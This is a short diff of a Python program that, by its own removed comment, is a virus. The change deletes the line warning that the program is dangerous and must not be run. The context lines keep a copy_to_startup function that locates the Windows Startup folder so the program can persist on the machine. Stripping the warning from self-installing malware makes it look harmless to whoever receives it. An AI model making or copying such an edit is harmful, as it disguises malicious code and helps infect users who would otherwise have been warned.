@@ -11,8 +11,6 @@ import webbrowser
 import time
 from tkinter import messagebox
 
-# This should be very obvious but this is a virus and its very dangerous. Please do not run it on your computer unless you really want to be dumb. You have been warned
-
 def copy_to_startup():
     # Get the path to the user's startup folder
     startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
